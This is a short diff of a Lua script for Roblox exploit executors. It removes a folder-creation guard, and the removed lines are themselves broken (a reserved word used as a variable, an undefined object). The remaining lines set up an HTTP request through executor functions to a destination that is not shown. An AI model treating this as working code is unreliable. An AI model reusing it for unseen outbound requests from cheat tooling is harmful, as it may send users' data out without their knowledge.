@@ -1,12 +1,3 @@
-local not = game:GetService("CoreGui")
-local folderName = "ak"
-local folder = Instance.new("Folder")
-folder.Name = folderName
-if Ikura:FindFirstChild(folderName) then    
-else
-folder.Parent = Ikura
-getgenv().field = true
-
 local HttpService = game:GetService("HttpService")
 
 local http_request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
@@ -59,4 +50,3 @@ local response = http_request {
         }}
     })
 }
-end
